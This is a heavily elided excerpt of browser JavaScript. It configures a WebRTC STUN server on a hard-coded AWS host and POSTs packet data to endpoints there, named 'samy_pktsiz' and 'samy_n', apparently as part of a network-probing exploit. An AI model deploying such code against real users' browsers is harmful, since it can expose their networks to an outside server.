...
var pc
var port
var stun = "stun:ec2-3-17-135-238.us-east-2.compute.amazonaws.com:3478"
...
function maxpktsize()
{
	...
	post("https://ec2-3-17-135-238.us-east-2.compute.amazonaws.com:5060/samy_pktsiz", pkt, 1)
...
function attemptPin(pkt)
{
	...
	post("https://ec2-3-17-135-238.us-east-2.compute.amazonaws.com:5060/samy_n?"+incr, pkt, 1)
}
...
//config={"iceServers":[{"urls":["stun:ec2-3-17-135-238.us-east-2.compute.amazonaws.com:3478"],"username":"hello","credential":"bye"}],"iceTransportPolicy":"all","iceCandidatePoolSize":"0"}
